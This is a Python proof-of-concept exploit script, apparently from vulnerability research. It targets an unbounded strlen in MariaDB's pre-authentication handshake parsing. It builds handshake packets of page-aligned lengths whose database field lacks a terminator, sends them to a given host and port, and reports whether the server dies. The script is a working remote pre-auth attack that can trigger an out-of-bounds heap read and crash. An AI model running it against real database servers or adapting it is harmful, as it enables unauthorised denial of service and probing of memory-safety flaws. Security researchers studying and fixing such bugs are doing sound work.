#!/usr/bin/env python3
"""
Targeted PoC for the unbounded strlen() at `next_field` in
parse_client_handshake_packet():

    char *next_field= passwd + passwd_len + (db ? db_len + 1 : 0);
    Lex_ident_plugin client_plugin= Lex_cstring_strlen(next_field);

`db_len = safe_strlen(db)` stops at the NUL the network layer guarantees at
read_pos[pkt_len], so laying the database field out so that it runs to the very
last byte of the packet puts next_field at read_pos + pkt_len + 1 -- one byte
past that terminator -- and the strlen from there is unbounded.

Whether that leaves the allocation depends on how much slack the buffer has:

    net_allocate_new_packet()/net_realloc() allocate
        net->max_packet + NET_HEADER_SIZE + COMP_HEADER_SIZE + 1
    i.e. max_packet + 8 bytes, and net_realloc() rounds max_packet up to a
    multiple of IO_SIZE (4096):
        pkt_length = (length + IO_SIZE - 1) & ~(IO_SIZE - 1)

So a packet whose length is an exact multiple of 4096 makes max_packet equal
pkt_len and leaves only 7 bytes between the terminator and the end of the
allocation. Any other length rounds up and restores a large slack.

This script sends exactly that layout at boundary-aligned and nearby lengths.
Run it against an ASAN build: a heap-buffer-overflow READ in
parse_client_handshake_packet / Lex_cstring_strlen is the finding.
"""

import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (  # noqa: E402
    Conn, server_alive, CLIENT_LONG_PASSWORD, CLIENT_PROTOCOL_41,
    CLIENT_SECURE_CONNECTION, CLIENT_CONNECT_WITH_DB, CLIENT_TRANSACTIONS,
)

CAPS = (CLIENT_LONG_PASSWORD | CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION |
        CLIENT_TRANSACTIONS | CLIENT_CONNECT_WITH_DB)


def build(total_len, user=b"demo"):
    """Handshake response of exactly total_len bytes, db running to the end.

    Layout:  [0..31] fixed header fields
             user + NUL
             1-byte auth-response length = 0
             database: every remaining byte non-zero, no terminator
    """
    head = (struct.pack("<I", CAPS) + struct.pack("<I", 0x01000000) +
            bytes([45]) + b"\x00" * 19 + struct.pack("<I", 0))
    assert len(head) == 32
    pkt = head + user + b"\x00" + b"\x00"       # auth-response length 0
    db_len = total_len - len(pkt)
    if db_len < 1:
        raise ValueError("total_len too small")
    # non-zero, no NUL anywhere, so safe_strlen(db) reaches read_pos[pkt_len]
    pkt += bytes(((i % 255) + 1) for i in range(db_len))
    assert len(pkt) == total_len
    return pkt


def attempt(host, port, total_len):
    try:
        c = Conn(host, port, timeout=8.0)
    except OSError as exc:
        return f"connect-failed: {exc}"
    try:
        if c.read_greeting() is None:
            return "no-greeting"
        c.send_packet(build(total_len))
        resp = c.read_packet()
        if resp is None:
            return "closed-without-reply"
        if resp[:1] == b"\xff":
            errno_ = struct.unpack("<H", resp[1:3])[0]
            return f"error {errno_}: {resp[9:].decode('latin1', 'replace')[:60]}"
        if resp[:1] == b"\x00":
            return "OK packet"
        if resp[:1] == b"\xfe":
            return "auth-switch request"
        return f"other: {resp[:32].hex()}"
    except OSError as exc:
        return f"io: {exc}"
    finally:
        c.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 3307

    # Multiples of 4096 leave 7 bytes of slack; the neighbours round up and
    # should be comfortably in bounds. net_buffer_length is 16384, so 16384 is
    # the first length that both triggers net_realloc and rounds to itself.
    lengths = [4096, 8192, 12288, 16384, 20480, 24576, 32768, 65536,
               16383, 16385, 20479, 20481]
    print(f"target {host}:{port}")
    print("  len        slack  reply")
    for n in lengths:
        max_packet = ((n + 4095) & ~4095) if n >= 16384 else 16384
        slack = max_packet + 8 - (n + 1)
        res = attempt(host, port, n)
        print(f"  {n:<10} {slack:<6} {res}")
        if not server_alive(host, port):
            print(f"  [!!] server died at len={n}")
            return 1
    print(f"\nserver still alive: {server_alive(host, port)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
